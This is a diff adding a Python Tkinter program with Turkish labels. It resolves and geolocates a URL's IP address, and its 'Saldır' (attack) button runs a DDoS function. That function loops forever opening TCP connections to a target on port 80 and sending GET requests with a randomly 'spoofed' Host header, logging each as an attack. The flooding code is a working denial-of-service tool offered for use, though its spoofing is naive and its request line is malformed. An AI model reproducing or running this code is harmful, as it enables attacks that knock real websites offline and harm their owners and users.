@@ -1,0 +1,92 @@
+from tkinter import *
+import socket
+from ip2geotools.databases.noncommercial import DbIpCity
+
+
+def Ip():
+    try:
+        if kutu.get():
+            url = '{}'.format(kutu.get())
+            ip = socket.gethostbyname(url)
+            sonuc = DbIpCity.get(ip, api_key='free')
+            yazi = "{} \n ------------- \n".format(sonuc)
+            metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))
+            metin_alani.insert(END, yazi, 'style')
+
+        else:
+            yazi = 'LÜTFEN BOŞ ALANLARI DOLDURUNUZ...\n'
+            metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))
+            metin_alani.insert(END, yazi, 'style')
+
+    except:
+        yazi = "Bu url'de sunucu bulunamadı...\n"
+        metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))
+        metin_alani.insert(END, yazi, 'style')
+
+def DDoS():
+    if kutu1.get():
+        url = '{}'.format(kutu1.get())
+        target = kutu1.get()
+        port = 80
+
+        while True:
+            ip = "{}.{}.{}.{}".format(*__import__("random").sample(range(0, 255), 4))
+            fake_ip = ip
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(target), port))
+            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
+            s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
+
+            metin_alani.tag_configure("style", foreground="green", font=("Arial", 10, "bold"))
+
+            bilgi = "attack from = {}   to : {} \n ".format(ip, target)
+            metin_alani.insert(END, bilgi, "style")
+
+            s.close()
+
+
+
+
+    else:
+        yazi = 'LÜTFEN BOŞ ALANLARI DOLDURUNUZ...\n'
+        metin_alani.tag_configure('style', foreground='green', font=('Arial', 10, 'bold'))
+        metin_alani.insert(END, yazi, 'style')
+
+
+
+pencere = Tk()
+pencere.geometry("360x360")
+pencere.title("Url'nin IP'sini ve Konumunu Öğrenme")
+
+yazi1 = Label(pencere)
+yazi1.config(text="url Giriniz: ", font=("Vertana", 10))
+yazi1.place(x=10, y=30)
+yazi = Label(pencere)
+yazi.config(text="Saldırı için url: ", font=("Vertana", 7))
+yazi.place(x=10, y=60)
+
+kutu = Entry(pencere)
+kutu.place(x=80, y=30)
+kutu1 = Entry(pencere)
+kutu1.place(x=80, y=60)
+
+buton = Button(pencere)
+buton.config(text="Bul", bg="yellow", fg="black", activebackground="red", command=Ip)
+buton.place(x=250, y=25)
+buton1 = Button(pencere)
+buton1.config(text="Saldır", bg="yellow", fg="black", activebackground="red", command=DDoS)
+buton1.place(x=250, y=60)
+
+
+frame3 = Frame(pencere, bg='#5f9ea0')
+frame3.place(relx=0, rely=0.3, relwidth=1.0, relheight=0.7)
+Label(frame3, text='TERMINAL BİLGİ PANELİ', bg='#5f9ea0', fg='black', font='Arial 12 bold').pack(pady=10, anchor=S)
+
+metin_alani = Text(frame3, height=14, width=60, bg='#bfbfbf')
+metin_alani.tag_configure('style', foreground='#333', font=('Arial', 10, 'bold'))
+metin_alani.pack()
+bilgi = '>>>İP ve KONUM BİLGİLERİ BURADA GÖRÜNECEK... \n'
+metin_alani.insert(END, bilgi, 'style')
+
+pencere.mainloop()
